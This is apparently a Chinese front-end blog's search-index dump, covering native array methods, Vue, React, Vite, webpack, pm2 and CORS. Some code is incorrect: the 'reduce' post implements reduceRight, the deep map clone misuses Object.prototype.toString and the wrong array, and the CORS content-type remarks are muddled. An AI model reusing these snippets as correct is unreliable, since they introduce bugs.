&quot;6.2.2&quot;,&quot;@babel/eslint-parser&quot;: &quot;7.15.8&quot;, 在.eslintrc.js文件内添加 123parserOptions: { parser: '@babel/eslint-parser'}, 最后这个问题成功解决 issue上也有讨论过这个问题， #issue 链接","link":"/2021/12/18/TypeError-token-type-endsWith-is-not-a-function-vue-eslint-%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D/"},{"title":"css3奇偶选择","text":"第一种：简单数字序号写法:nth-child(number) 直接匹配第number个元素。参数number必须为大于0的整数。 例子： 123代码如下:li:nth-child(3){background:orange;} 第二种：倍数写法:nth-child(an) 匹配所有倍数为a的元素。其中参数an中的字母n不可缺省，它是倍数写法的标志，如3n、5n。 例子： 123代码如下:li:nth-child(3n){background:orange;} 第三种：倍数分组匹配:nth-child(an+b) 与 :nth-child(an-b) 先对元素进行分组，每组有a个，b为组内成员的序号，其中字母n和加号+不可缺省，位置不可调换，这是该写法的标志，其中a,b均为正整数或0。如3n+1、5n+1。但加号可以变为负号，此时匹配组内的第a-b个。（其实an前面也可以是负号，但留给下一部分讲。） 例子： 1234567代码如下:li:nth-child(3n+1){background:orange;} li:nth-child(3n+5){background:orange;} li:nth-child(5n-1){background:orange;} li:nth-child(3n±0){background:orange;}li:nth-child(±0n+3){background:orange;} 第四种：反向倍数分组匹配:nth-child(-an+b) 此处一负一正，均不可缺省，否则无意义。这时与:nth-child(an+1)相似，都是匹配第1个，但不同的是它是倒着算的，从第b个开始往回算，所以它所匹配的最多也不会超过b个。 例子： 123代码如下:li:nth-child(-3n+8){background:orange;}li:nth-child(-1n+8){background:orange;} 第五种：奇偶匹配:nth-child(odd) 与 :nth-child(even) 分别匹配序号为奇数与偶数的元素。奇数(odd)与(2n+1)结果一样；偶数(even)与(2n+0)及(2n)结果一样。","link":"/2019/09/22/css3%E5%A5%87%E5%81%B6%E9%80%89%E6%8B%A9/"},{"title":"forEach的原生写法","text":"forEach作用: 循环遍历数组特点:不改变原数组，返回值为undefined。改变不了数组的遍历(return/break不好使，会报错) 源码实现 123456Array.prototype.myForEach = function(func) { var len = this.length; for(var i = 0; i &lt; len; i++) { func(this[i], i); }}","link":"/2019/12/29/forEach%E7%9A%84%E5%8E%9F%E7%94%9F%E5%86%99%E6%B3%95/"},{"title":"map的原生写法","text":"map特点:map处理return出来的值，把值放在一个新的数组，默认返回undefined。浅拷贝，会改变原数组。浅度map实现 12345678Array.prototype.myMap = function(func) { var len = this.length, newArr = []; for(var i = 0; i &lt; len; i++) { newArr.push(func(this[i], i)); } return newArr;} 深度map实现 1234567891011121314151617181920212223242526272829303132333435363738// 深度克隆function deepClone(target, option) { if(option !== null) { for(var prop in option) { var src = target[prop], copy = option[prop]; if(typeof(copy) === 'object') { if(Object.prototype.toString(copy) === '[object Array]') { src = []; }else { src = {}; } target[prop] = deepClone(src, copy); }else { target[prop] = copy; } } } return target;}Array.prototype.myMap = function(func) { var len = this.length, newArr = []; for(var i = 0; i &lt; len; i++) { if(this[i] &amp;&amp; Object.prototype.toString.call(this[i]) === '[object Object]') { var newObj = {}; deepClone(newObj, this[i]); newArr.push(func(newObj, i)); }else if(this[i] &amp;&amp; Object.prototype.toString.call(this[i]) === '[object Array]') { var Arr = []; deepClone(newArr, this[i]); newArr.push(func(Arr, i)); }else { newArr.push(func(this[i], i)); } } return newArr;}","link":"/2020/03/29/map%E7%9A%84%E5%8E%9F%E7%94%9F%E5%86%99%E6%B3%95/"},{"title":"filter的原生写法","text":"filter作用: filter筛选数组，筛选出新的数组。特点: 筛选的值由return来决定，会放在一个新的数组中返回。 源码实现 12345678910Array.prototype.myFilter = function(func) { var len = this.length, newArr = []; for(var i = 0; i &lt; len; i++) { if(func(this[i], i)) { newArr.push(this[i]); } } return newArr;}","link":"/2020/03/21/filter%E7%9A%84%E5%8E%9F%E7%94%9F%E5%86%99%E6%B3%95/"},{"title":"js判断是否可以打开本地软件","text":"js 判断是否安装插件 需求：点击一个按钮，然后打开本地的软件。类似一些网站打开 qq 一样。但是后来遇到一个问题，如果本地没有安装这个指定的软件，则无法打开。所以需要判断当前的电脑是否已经安装指定软件，如果已安装，则打开软件；否则，弹出模态框，提示下载并安装软件。如果本地安装了插件，当尝试使用插件打开时，window后触发blur事件；如果无法打开插件，则什么都不会发生。 根据这个原理，进行一个简单的封装。（其实也不算是封装，只是简单的把其中的原理展现出来而已） 这里使用的是es5代码，主要是为了兼任低版本的浏览器，可以在理解其中的原理后，移植到相应的项目或者框架。 1234567891011121314151617181920212223242526272829303132// dom部分&lt;p class=&quot;link&quot; data-link=&quot;blahblah:randomstuff&quot;&gt;plugin 1&lt;/p&gt;&lt;p class=&quot;link&quot; data-link=&quot;mailto:johndoe@somewhere.com&quot;&gt;plugin 2&lt;/p&gt;&lt;p class=&quot;link&quot; data-link=&quot;tencent://message&quot;&gt;plugin 3&lt;/p&gt;// js部分var links = document.getElementsByClassName('link')var readyToBlur = falsevar hasPlugin = nullvar timeout = 1000window.addEventListener('blur', function () { if (readyToBlur) { hasPlugin = true console.log('has plugin') }})for (var i = 0; i &lt; links.length; i++) { (function (id, win) { links[id].addEventListener('click', function () { readyToBlur = true hasPlugin = false window.location.href = links[id].getAttribute('data-link') var t = setTimeout(function () { win.readyToBlur = false !hasPlugin &amp;&amp; onHasNoPlugin(links[id].innerText) clearTimeout(t) }, timeout) }) })(i, window)}function onHasNoPlugin(pluginName) { console.log('no plugin: ' + pluginName)} 原理分析 打开本地插件（软件，例如 qq）的方法基本是让浏览器的 url 发生改变，一般有以下方法： 123使用a标签，并使用href属性。&lt;a href=&quot;plugin:data&quot;&gt;plugin&lt;/a&gt;window.location.href = 'plugin:data'window.open('plugin:data') 这里使用的是第二种方法。第一种不好做拦截，第三种无论是否安装都会打开一个新的窗口。 当尝试打开软件时，开始监听window的blur事件。在指定的事件内，如果触发了blur事件，说明软件已经安装，修改hasPlugin标识；否则无操作。然后当时间到期时，移除监听，并判断hasPlugin的值，如果为false，则说明没有安装插件，执行相应的处理函数。 另外还需注意一点，这里设置的 timeout 是根据实际情况而定的，因为有一些软件打开的速度可能很慢，不会像 qq 这样的软件一点击就会马上打开，所以这里把监听的 timeout 设置为 1 秒。","link":"/2018/10/14/js%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0%E8%BD%AF%E4%BB%B6/"},{"title":"node版本切换工具n的使用介绍","text":"node版本切换工具n的使用介绍n交互式管理 Node.js 版本 支持的平台n在 macOS、Linux（包括适用于 Linux 的 Windows 子系统）和各种其他类 Unix 系统上均受支持。它被编写为 BASH 脚本，但不需要您使用 BASH 作为您的命令外壳。 n 在 Microsoft Windows（如 PowerShell）的本机 shell、Windows BASH 的 Git 或 Cygwin DLL 中不起作用。 全局安装1npm install -g n mac的安装目录/usr/local/n/versions/node/13.2.0因此首先在/usr/local/创建目录n，修改权限为普通访问权限，这样后续操作就不需要使用sudo 基本操作123456789n x.x.x 安装某个版本n latest 安装最新版本n stable 安装稳定版本ltsn rm x.x.x 删除某个版本n use 7.10.0 some.js 用制定的版本执行脚本n 可以查看所有已安装的node版本，可以根据上下和回车选择要使用的版本n help 帮助信息n ls 查看已经安装的版本n ls-remote --all 查看服务器上所有可用的版本","link":"/2021/09/12/node%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E5%B7%A5%E5%85%B7n%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/"},{"title":"pm2的基本使用","text":"PM2PM2 是一个带有负载均衡功能的 Node 应用进程管理器。 主要特性： 内建负载均衡（使用 Node cluster 集群模块） 后台运行 0 秒停机重载 具有 Ubuntu 和 CentOS 的启动脚本 停止不稳定的进程（避免无限循环） 控制台检测 提供 HTTP API 远程控制和实时的接口 API（Nodejs 模块，允许和 PM2 进程管理器交互） 全局安装pm21npm install -g pm2 启动进程12345pm2 start app.js//重命名进程pm2 start app.js --name wb123//监听代码变化pm2 start app.js --watch 结束进程123pm2 stop app.js//结束所有进程pm2 stop all 删除进程123pm2 delete www//删除所有进程pm2 delete all 查看进程123456//列出所有进程pm2 list//查看某个进程情况pm2 describe app.js//查看进程资源消耗情况pm2 monit PM2日志123pm2 logs//查看某个进程的日志pm2 logs app.js 重启进程123pm2 restart app.js//重启所有进程pm2 restart all PM2下使用 执行npm命令123npm run dev 等同于 pm2 start npm -- run devnpm start 等同于 pm2 start npm -- start 命名进程名123pm2 start npm --name test -- run devpm2 start npm --name test -- start 语法： pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt; 其中 – watch监听代码变化，– name重命名任务名称，– run后面跟脚本名字","link":"/2021/12/26/pm2%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"},{"title":"react父子组件通信","text":"子组件调用父组件：1）在父组件设置对应的属性和方法；2）将父组件的属性，方法设置在子组件的标签属性上；3）子组件中利用this.props来调用父组件的成员； example：123456789101112131415161718//父组件：var parent=React.cleateClass({ getDefaultProps:function(){ alert(&quot;父组件方法&quot;) }, render:function(){ return &lt;children a=&quot;233&quot; getDefaultProps={this.getDefaultProps}&gt;&lt;/children&gt; }})//子组件：var children=react.createClass({ render:fucntion(){ return &lt;div&gt; &lt;p&gt;从父组件取得的值：{this.props.a}&lt;/p&gt; &lt;button onClick={this.props.getDefaultProps}&gt;子组件按钮&lt;/button&gt; &lt;/div&gt; }}) 父组件调用子组件：1）在父组件中的子组件利用ref对子组件标注引用；2）在父组件中利用this，refs获取子组件的引用，从而调用子组件的成员； example：12345678910111213141516171819202122//父组件：var parent=React.cleateClass({ getDS:function(){ this.refs.one.hands(); }, render:function(){ return &lt;div&gt; &lt;children ref=&quot;one&quot;&gt;&lt;/children&gt; &lt;button onClick={this.getDS}&gt;发起请求&lt;/button&gt; &lt;/div&gt; }})//子组件：var children=React.createClass({ hands:function(){ alert('父组件调用成功'); } render:fucntion(){ return &lt;div&gt;&lt;/div&gt; }})","link":"/2017/09/01/react%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"},{"title":"vite初体验","text":"Vite —— 一种新的、更快地 web 开发工具。 vite 是什么vite —— 一个由 vue 作者尤雨溪开发的 web 开发工具，它具有以下特点： 1.快速的冷启动 2.即时的模块热更新 3.真正的按需编译 Vite介绍Vite，一个基于浏览器原生 ES imports 的开发服务器。利用浏览器去解析 imports，在服务器端按需编译返回，完全跳过了打包这个概念，服务器随起随用。同时不仅有 Vue 文件支持，还搞定了热更新，而且热更新的速度不会随着模块增多而变慢。针对生产环境则可以把同一份代码用 rollup 打包。 英文文档 中文文档 GitHub 搭建第一个 Vite 项目兼容性注意 Vite 需要 Node.js 版本 &gt;= 12.0.0。 使用 NPM: 1npm init @vitejs/app 使用 Yarn: 1yarn create @vitejs/app 通过如下命令搭建 1234npm init vite-app &lt;project-name&gt;cd &lt;project-name&gt;npm installnpm run dev 搭建后的项目目录结构如下： 因为 Vite 是一个基于原生 ESM 的开发服务器，所以可以看出是秒启动的。 初始化搭建的demo也比较简单 看下package.json里的代码： 123456789101112131415{ &quot;name&quot;: &quot;vite-app&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;scripts&quot;: { &quot;dev&quot;: &quot;vite&quot;, &quot;build&quot;: &quot;vite build&quot; }, &quot;dependencies&quot;: { &quot;vue&quot;: &quot;^3.0.4&quot; }, &quot;devDependencies&quot;: { &quot;vite&quot;: &quot;^1.0.0-rc.13&quot;, &quot;@vue/compiler-sfc&quot;: &quot;^3.0.4&quot; }} 可以看出vite 是和 vue 3 搭配使用的。 vue 3 无论性能、包大小还有 ts 加持方面，vue 3 都远优于 vue 2的。 而build的过程，是利用 Rollup 进行构建的。","link":"/2021/03/20/vite%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"title":"reduce的原生写法","text":"reduce特点: reduce() 方法接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。源码实现 12345678910111213Array.prototype.myReduceRight = function(func, init) { var prev = init, len = this.length, k = len - 1; if(init === undefined) { prev = this[k]; k = len - 2; } for(k; k &gt;= 0; k --) { prev = func(prev, this[k], k); } return prev;}","link":"/2020/04/19/reduce%E7%9A%84%E5%8E%9F%E7%94%9F%E5%86%99%E6%B3%95/"},{"title":"vue-cli自定义组件的引用","text":"在对应组件内引入组件1.在components（专门放组件的文件）下创建一个header.vue文件2.在App.vue文件里添加如下代码 12345678910 &lt;my-head&gt;&lt;/my-head&gt;import myHead from './components/header' components : { myHead, } 全局组件的引用注册一个全局组件语法格式如下： 1Vue.component(tagName, options) tagName 为组件名，options 为配置选项。注册后，我们可以使用以下方式来调用组件： 1&lt;tagName&gt;&lt;/tagName&gt; 实例代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;demo&lt;/title&gt; &lt;script src=&quot;static/js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;!--全局组件--&gt;&lt;div id=&quot;app&quot;&gt; &lt;uuihoo&gt;&lt;/uuihoo&gt;&lt;/div&gt;&lt;script&gt; //注册 Vue.component('uuihoo',{ template:'&lt;h1&gt;自定义全局组件&lt;/h1&gt;' }); //创建根实例 new Vue({ el:&quot;#app&quot; })&lt;/script&gt; &lt;!--局部组件--&gt;&lt;div id=&quot;app1&quot;&gt; &lt;uuihoo1&gt;&lt;/uuihoo1&gt;&lt;/div&gt;&lt;script&gt; //创建根实例 new Vue({ el:'#app1', components:{ //&lt;uuihop&gt;将只在模板可用 'uuihoo1':{template:'&lt;h1&gt;自定义局部组件&lt;/h1&gt;'} } })&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 注意事项：tagName不能和原生html标签同名。","link":"/2018/08/19/vue-cli%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6%E7%9A%84%E5%BC%95%E7%94%A8/"},{"title":"vue-cli开发中，ajax跨域请求方法","text":"使用vue-cli构建的项目，在开发时，想要访问后台接口获取数据，这时就会出现跨域问题。在config/index.js中进行如下配置 【即在进行ajax请求时，地址中任何以/api开头的请求地址都被解析为目标地址，target就是你想要的后台接口地址】 123456789 proxyTable: { '/api': { target: 'http://www.leheavengame.com', changeOrigin: true, pathRewrite: { '^/api': '' } }} vue-resource调用示例12345this.$http.get('/api/main/login', [data]).then(function(response){ // 响应成功回调}, function(response){ // 响应错误回调}); axios调用示例123456789101112axios({ method: 'get', headers: {'Accept': '*/*'}, url: '/api/main/login', data: data}).then(function (response) { console.log(response.data)}).catch(function (error) { console.log(error)}) 讲解原理：在配置中： target: ‘http://www.leheavengame.com‘在上方vue-resource示例中 第一个参数为： /api/user/login就会被本地服务器自动解析为 http://www.leheavengame.com/main/login 而这个正式我们需要的地址。跨域原理（本地文件假装在远程服务器上）： 通过浏览器打开页面，当发起请求时：本地服务器的地址（通常是localhost:8080或者127.0.0.1:8080）会收到这个请求，接下来发现这个请求地址中含有字符串 /api，那么本地服务器会将请求地址变为 http://www.leheavengame.com （配置地址） + main/login（调用方法处的详细地址）。同时本地服务器的地址会由localhost:8080 变为http://www.leheavengame.com ，结果就是： 我们本地的文件会被认为是放在目标地址（http://www.leheavengame.com ）服务器上的，当前服务器上的文件请求服务器其他东西，自然就不是跨域了。","link":"/2017/09/24/vue-cli%E5%BC%80%E5%8F%91%E4%B8%AD%EF%BC%8Cajax%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/"},{"title":"vue-router中keep-alive的作用","text":"keep-alive 简介keep-alive 是 Vue 内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染。用法也很简单： 12345&lt;keep-alive&gt; &lt;component&gt; &lt;!-- 该组件将被缓存！ --&gt; &lt;/component&gt;&lt;/keep-alive&gt; propsinclude - 字符串或正则表达，只有匹配的组件会被缓存exclude - 字符串或正则表达式，任何匹配的组件都不会被缓存 123456789101112131415161718// 组件 aexport default { name: 'a', data () { return {} }}&lt;keep-alive include=&quot;a&quot;&gt; &lt;component&gt; &lt;!-- name 为 a 的组件将被缓存！ --&gt; &lt;/component&gt;&lt;/keep-alive&gt;可以保留它的状态或避免重新渲染&lt;keep-alive exclude=&quot;a&quot;&gt; &lt;component&gt; &lt;!-- 除了 name 为 a 的组件都将被缓存 ！--&gt; &lt;/component&gt;&lt;/keep-alive&gt;&lt;!--可以保留它的状态或避免重新渲染 ！--&gt; 使用 router.meta 拓展123456789101112131415161718192021222324252627// routes 配置export default [ { path: '/', name: 'home', component: Home, meta: { keepAlive: true // 需要被缓存 } }, { path: '/:id', name: 'edit', component: Edit, meta: { keepAlive: false // 不需要被缓存 } }]&lt;keep-alive&gt; &lt;router-view v-if=&quot;$route.meta.keepAlive&quot;&gt; &lt;!-- 这里是会被缓存的视图组件，比如 Home！ --&gt; &lt;/router-view&gt;&lt;/keep-alive&gt;&lt;router-view v-if=&quot;!$route.meta.keepAlive&quot;&gt; &lt;!-- 这里是不被缓存的视图组件，比如 Edit！ --&gt;&lt;/router-view&gt; 在非单页应用的时候，keep-alive 并不能有效的缓存了","link":"/2018/03/23/vue-router%E4%B8%ADkeep-alive%E7%9A%84%E4%BD%9C%E7%94%A8/"},{"title":"vue2老项目vite升级改造","text":"前言 Vite是一种新型前端构建工具，能够显著提升前端开发体验。它主要由两部分组成： 一个开发服务器，它基于 原生 ES 模块 提供了 丰富的内建功能，如速度快到惊人的 模块热更新（HMR）。 一套构建指令，它使用 Rollup 打包你的代码，并且它是预配置的，可输出用于生产环境的高度优化过的静态资源。 Vite 意在提供开箱即用的配置，同时它的 插件 API 和 JavaScript API 带来了高度的可扩展性，并有完整的类型支持。 vite包含如下特点： 光速启动 热模块替换 按需编译 本次在开发环境增加vite的启动方式，提升开发效率，在生产环境保持原有模式。 背景 本次改造的工程是公司内一个很重要，迭代维护了3年的老项目，随着项目代码量的逐渐增加，项目启动速度的速度越来越慢，已经严重影响了开发效率，启动时间接近2分钟。 该项目由@vue/cli 搭建的webpack模版，之前做过一次webpack3-&gt;的一次升级，现使用webpack4.x版本。 在搭建vite的过程中，理想状况是业务代码的0改动。 改造过程 保留webpack的选项 由于vite使用ES6 Module方式组织代码,index.html的导入方式不通，复制index.html-&gt;prod.html 并修改webpack HtmlWebpackPlugin插件的template（开发和生产配置会有不同，保留原有配置即可） new HtmlWebpackPlugin({ template: ‘prod.html’, }), vite引入和配置 安装 1npm i vite --save-dev 并在根目录新建vite.config.js文件 123456789101112131415161718192021import { defineConfig } from 'vite' import path from 'path' export default () =&gt; defineConfig({ resolve: { extensions: ['.js', '.vue', '.json', '.less'], alias: { vue: 'vue/dist/vue.esm.js', '@': path.resolve(__dirname, 'src'), } }, server: { port: 8080, // vite默认是3000端口，保留原有的端口号 proxy: { '/api': { target: 'http://baidu.com/', changeOrigin: true, rewrite: path =&gt; path.replace(/^\\/api/, '') } } } }) 添加 packge.json 中 scripts 命令，并改变原有的webpack命令 123456{ &quot;scripts&quot;: { &quot;dev&quot;: &quot;vite&quot; , &quot;dev:w&quot;: &quot;webpack-dev-server --inline --progress --config build/webpack.dev.conf.js --profile&quot; } } 修改 index.html中的入口文件导入方式 配置完后我们就可以尝试运行vite了 命令行输入npm run dev 运行后，我们可以看到很多报错，这么多错误信息如果手动修改的话，无疑是一项巨大的工程，而且这些改动没有任价值。针对vite 工程的改造，我们可以通过插件解决对应问题。 vite-plugins引入 虽然 vite 发展很快，npm 上面也陆陆续续有vite的插件更新，但是总有一些没有覆盖到的场景，官方的核心插件如下，我们的项目使用的是vue2版本的，所以用的是vite-plugin-vue2插件。 12345678910// vite.config.jsimport { createVuePlugin } from 'vite-plugin-vue2'export default { plugins: [ createVuePlugin({ jsx: true, }) ],} 针对这个场景，使用的是自己写了一个插件vite-plugin-vue2-jsx，将需要修改的处理，全部由插件来进行转化 使用 vite-plugin-vue2-jsx 替换 vite-plugin-vue2 ，自动处理 代码块和js文件的 jsx 语法 12345678910// vite.config.jsimport { createVuePlugin } from 'vite-plugin-vue2-jsx'export default { plugins: [ createVuePlugin({ jsx: true, }) ],} require报错问题 这个问题vite是使用ESModule编译的，不支持CommonJs的原因，所以我们就需要将CommonJs 转换为ESModule。 项目中存在两种情况： 图片require引用 1&lt;img class=&quot;logo&quot; :src=&quot;require('./images/logo.png')&quot;/&gt; 在npm上找了半天也没找到我需要的插件，针对这个场景，索性自己写了一个插件vite-plugin-image-require 12345678// vite.config.jsimport { imageRequirePlugin } from 'vite-plugin-image-require'export default { plugins: [ imageRequirePlugin() ],} 2. 枚举的引用 通过引入 vite-plugin-require-transform 插件来处理 1npm i vite-plugin-require-transform --save-dev 配置 1234567import requireTransform from 'vite-plugin-require-transform';export default defineConfig({ plugins: [ requireTransform({fileRegex:/.js$|.vue$/}), ],}); 转换 @import ~ 别名 12345resolve: { alias: { '~': path.join(__dirname, 'node_modules'), } }, webpack的 process.env 的环境变量在项目中的使用导致的页面报错，无法加载 123define: { 'process.env': process.env}, 完整配置1234567891011121314151617181920212223242526272829303132333435363738import { defineConfig } from 'vite'import { imageRequirePlugin } from 'vite-plugin-image-require'import { createVuePlugin } from 'vite-plugin-vue2-jsx'import requireTransform from 'vite-plugin-require-transform';import path from 'path'export default () =&gt; defineConfig({ define: { 'process.env': process.env }, plugins: [ createVuePlugin({ jsx: true, }), requireTransform({ fileRegex:/.js$|.vue$/ }), imageRequirePlugin(), ], resolve: { extensions: ['.js', '.vue', '.json', '.less'], alias: { vue: 'vue/dist/vue.esm.js', '@': path.resolve(__dirname, 'src'), '~': path.join(__dirname, 'node_modules'), } }, server: { port: 8080, // vite默认是3000端口，保留原有的端口号 proxy: { '/api': { target: 'http://baidu.com/', changeOrigin: true, rewrite: path =&gt; path.replace(/^/api/, '') } } }}) 结束12345# 使用vite启动服务npm run dev# 使用webpack启动服务npm run dev:w","link":"/2022/12/19/vue2%E8%80%81%E9%A1%B9%E7%9B%AEvite%E5%8D%87%E7%BA%A7%E6%94%B9%E9%80%A0/"},{"title":"【fetch跨域请求】cors","text":"当使用fetch 发起跨域请求时，CORS（跨域资源共享Cross-origin resource sharing） 请求fetch 123456789101112131415161718const body = {name:&quot;Good boy&quot;}; fetch(&quot;http://leheavengame.com/API&quot;,{ headers:{ 'content-type':'application/json' } method:'POST', body: JSON.stringify(body)}).then(response =&gt; response.json().then(json =&gt; ({ json, response }))).then(({ json, response }) =&gt; { if (!response.ok) { return Promise.reject(json); } return json;}).then( response =&gt; response, error =&gt; error ); 如果服务器返回的 response 头包含 “Access-Control-Allow-Origin：”或者 为与请求源相同的地址。即服务器支持浏览器跨域访问。若不包含需求修改服务器端，与浏览器端请求。 如果服务器不支持CORS，fetch提供了三种模式，其中no-cors可以继续访问服务器fetch的mode配置项有3个值，如下： same-origin：该模式是不允许跨域的，它需要遵守同源策略，否则浏览器会返回一个error告知不能跨域；其对应的response type为basic。 cors: 该模式支持跨域请求，顾名思义它是以CORS的形式跨域；当然该模式也可以同域请求不需要后端额外的CORS支持；其对应的responsetype为cors。 no-cors: 该模式用于跨域请求但是服务器不带CORS响应头，也就是服务端不支持CORS；这也是fetch的特殊跨域请求方式；其对应的responsetype为opaque。 针对跨域请求，cors模式是常见跨域请求实现，但是fetch自带的no-cors跨域请求模式则较为陌生，该模式有一个比较明显的特点： 该模式允许浏览器发送本次跨域请求，但是不能访问响应返回的内容，这也是其response type为opaque透明的原因。 注意： cors 支持 三种content-type 不支持 application/json application/x-www-form-urlencoded multipart/form-data text/plain 对于Express提供的服务端为了能提供CORS服务需要添加： 123456789//设置跨域访问 app.all('*', function(req, res, next) { res.header(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); res.header(&quot;Access-Control-Allow-Headers&quot;, &quot;X-Requested-With&quot;); res.header(&quot;Access-Control-Allow-Methods&quot;,&quot;PUT,POST,GET,DELETE,OPTIONS&quot;); res.header(&quot;X-Powered-By&quot;,' 3.2.1') res.header(&quot;Content-Type&quot;, &quot;application/json;charset=utf-8&quot;); next(); });","link":"/2018/12/31/%E3%80%90fetch%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E3%80%91cors/"},{"title":"webpack优化","text":"webpack优化之路1.别名alia12345'react': (0, join)(__dirname, './node_modules/react/dist/react.min.js'),resolve: { alias: alias,}, 2.css-loader &lt; 0.15.01&quot;css-loader&quot;: &quot;^0.14.1&quot;, 3.移除css-loader的sourcemap这一步暂时没多大效果，继续下面的步骤 4.外部引入模块1234567891011externals: { 'react': 'React', 'react-dom': 'ReactDOM', 'reactUpdate': 'ReactUpdate', 'antd': 'antd', &quot;jquery&quot;: &quot;jQuery&quot;, 'AMap': 'window.AMap', 'moment': 'moment', 'react-dnd': 'ReactDnD', 'react-router': 'ReactRouter'}, 必须设置 123output: { 'libraryTarget': 'var',}, 然后html引入外部js 12&lt;script src=&quot;${assetsAt('react.min.js')}&quot;&gt;&lt;/script&gt;&lt;script src=&quot;${assetsAt('react-dom.min.js')}&quot;&gt;&lt;/script&gt; 5.设置cache为true1cache: true, 6.设置root123resolve: { root: [path.resolve('./src')],}, 7.设置babel的cacheDirectory为true(打包性能提升很明显,相关链接)123456789101112131415161718192021/** babel参数* */var babelQuery = { presets: ['es2015', 'react', 'stage-0'], plugins: ['transform-runtime', 'add-module-exports', 'typecheck', &quot;transform-decorators-legacy&quot;], cacheDirectory: true};loaders: [ { test: /\\.js$/, exclude: /node_modules/, loader: 'babel', query: babelQuery }, { test: /\\.jsx$/, loader: 'babel', query: babelQuery }] 8.一些loader的大小限制(限制小于多少才转为base64,让生成的文件最小)123456789101112131415161718192021loaders: [ { test: /\\.woff(\\?v=\\d+\\.\\d+\\.\\d+)?$/, loader: 'url?limit=10000&amp;minetype=application/font-woff' }, { test: /\\.woff2(\\?v=\\d+\\.\\d+\\.\\d+)?$/, loader: 'url?limit=10000&amp;minetype=application/font-woff' }, { test: /\\.ttf(\\?v=\\d+\\.\\d+\\.\\d+)?$/, loader: 'url?limit=10000&amp;minetype=application/octet-stream' }, { test: /\\.eot(\\?v=\\d+\\.\\d+\\.\\d+)?$/, loader: 'file' }, { test: /\\.svg(\\?v=\\d+\\.\\d+\\.\\d+)?$/, loader: 'url?limit=10000&amp;minetype=image/svg+xml' }, { test: /\\.(wav|mp3)?$/, loader: 'url-loader?limit=8192' }] 9.noParse如果你 确定一个模块中没有其它新的依赖 就可以配置这项，webpack 将不再扫描这个文件中的依赖。 12345678module: { loaders: [ ], noParse: [ /moment-with-locales/ ]}, 10.拷贝静态文件把指定文件夹xia的文件复制到指定的目录 12345678910111213141516171819202122232425262728293031var CopyWebpackPlugin = require('copy-webpack-plugin');var copyFile = { production: [ {from: 'src/static/antd-0.12.15.min.css', to: 'antd.min.css'}, {from: 'src/static/antd-0.12.15.min.js', to: 'antd.min.js'}, {from: 'src/static/jquery-2.2.1.min.js', to: 'jquery.min.js'}, {from: 'src/static/react-15.0.1.min.js', to: 'react.min.js'}, {from: 'src/static/react-dom-15.0.1.min.js', to: 'react-dom.min.js'}, {from: 'src/static/react-update-0.14.6.min.js', to: 'react-update.min.js'}, {from: 'src/static/favicon.ico', to: 'favicon.ico'}, {from: 'src/static/moment-2.13.0.min.js', to: 'moment.min.js'}, {from: 'src/static/react-dnd-2.1.4.min.js', to: 'react-dnd.min.js'}, {from: 'src/static/react-router-1.0.3.min.js', to: 'react-router.min.js'} ], development: [ {from: 'src/static/antd-0.12.15.min.css', to: 'antd.min.css'}, {from: 'src/static/antd-0.12.15.min.js', to: 'antd.min.js'}, {from: 'src/static/jquery-2.2.1.min.js', to: 'jquery.min.js'}, {from: 'src/static/react-development-15.0.1.min.js', to: 'react.min.js'}, {from: 'src/static/react-dom-development-15.0.1.min.js', to: 'react-dom.min.js'}, {from: 'src/static/react-update-0.14.6.min.js', to: 'react-update.min.js'}, {from: 'src/static/favicon.ico', to: 'favicon.ico'}, {from: 'src/static/moment-2.13.0.min.js', to: 'moment.min.js'}, {from: 'src/static/react-dnd-2.1.4.min.js', to: 'react-dnd.min.js'}, {from: 'src/static/react-router-1.0.3.min.js', to: 'react-router.min.js'} ]};new CopyWebpackPlugin( (runmod == 'devserver') ? copyFile.development : copyFile.production), 11.设置dll原理就是将特定的模块在项目构建前构建好，然后通过页面引入。 12.使用happypack让loader多进程去处理文件。 12345678910111213var HappyPack = require('happypack');loader: test: /\\.js$/, exclude: /node_modules/, loader: 'babel', query: babelQuery, happy: { id: 'babelJs' }plugins: new HappyPack({ id: 'babelJs' , threads: 4 }),","link":"/2017/04/17/webpack%E4%BC%98%E5%8C%96/"},{"title":"什么是ES6？","text":"什么是ES6？ECMAScript 6（以下简称ES6）是JavaScript语言的下一代标准，已经在2015年6月正式发布了。Mozilla公司将在这个标准的基础上，推出JavaScript 2.0。 ECMAScript和JavaScript到底是什么关系？很多初学者会感到困惑，简单来说，ECMAScript是JavaScript语言的国际标准，JavaScript是ECMAScript的实现。 1996年11月，JavaScript的创造者Netscape公司，决定将JavaScript提交给国际标准化组织ECMA，希望这种语言能够成为国际标准。次年，ECMA发布262号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为ECMAScript。这个版本就是ECMAScript 1.0版。 ES6的目标，是使得JavaScript语言可以用来编写大型的复杂的应用程序，成为企业级开发语言。 作为新一代标准ES6将为我们带来很多令人欣喜的功能特性，本课程将着重带领大家领略ES6的风采，因此在学习本课程前需要具备JavaScript的基础知识，如果你并不了解JavaScript是什么，可以先学习一下JavaScript的入门课程。 支持 